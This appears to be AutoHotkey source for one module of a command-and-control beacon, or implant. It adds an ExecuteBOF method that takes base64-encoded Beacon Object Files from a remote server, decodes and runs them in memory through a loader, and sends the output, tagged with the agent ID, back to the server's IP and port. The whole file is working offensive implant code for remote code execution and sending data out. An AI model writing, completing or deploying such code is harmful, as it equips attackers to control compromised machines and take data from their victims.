; ============================================================================
; BOF LOADER - NetworkClient Integration
; ============================================================================
; Methods to integrate BOF execution into the NetworkClient class
; These methods should be added to the NetworkClient class in the assembled beacon
; ============================================================================

; Execute a module by name with parameters
; This method dispatches to specific module handlers
ExecuteModule(module, parameters) {
    switch module {
        case "bof", "execute_bof":
            return this.ExecuteBOF(parameters)
        default:
            this.Log("Unknown module: " module)
            return false
    }
}

; Execute a BOF (Beacon Object File)
; Parameters format: base64_bof_data|arg1|arg2|...
ExecuteBOF(parameters) {
    this.Log("Executing BOF with parameters: " parameters)
    BOFLog("========================================", "BEACON")
    BOFLog("       BOF REQUEST RECEIVED", "BEACON")
    BOFLog("========================================", "BEACON")

    try {
        ; parameters format: base64_bof_data|arg1|arg2|...
        parts := StrSplit(parameters, "|")
        bofBase64 := parts[1]

        BOFLog(Format("Base64 BOF data length: {} chars", StrLen(bofBase64)), "BEACON")

        ; Decode BOF from base64 (call standalone helper function)
        bofBytes := Base64Decode(bofBase64)

        if (!bofBytes || bofBytes.Size = 0) {
            throw Error("Failed to decode BOF data")
        }

        BOFLog(Format("Decoded BOF size: {} bytes", bofBytes.Size), "BEACON")
        this.Log("Decoded BOF: " bofBytes.Size " bytes")

        ; Extract arguments
        args := []
        Loop parts.Length - 1 {
            args.Push(parts[A_Index + 1])
        }

        BOFLog(Format("BOF arguments: {}", args.Length), "BEACON")

        ; Execute BOF
        loader := BOFLoader()
        try {
            output := loader.Execute(bofBytes, args)
            BOFLog("Sending output to server...", "BEACON")
            message := Format("command_output|{}|{}", this.agentID, output)
            this.SendMsg(this.serverIP, this.serverPort, message)
            BOFLog("BOF execution completed successfully", "BEACON")
            return true
        } finally {
            loader.Cleanup()
        }

    } catch as err {
        BOFLog(Format("BOF execution failed: {}", err.Message), "BEACON")
        this.Log("BOF execution failed: " err.Message)
        message := Format("command_output|{}|BOF Error: {}", this.agentID, err.Message)
        this.SendMsg(this.serverIP, this.serverPort, message)
        return false
    }
}
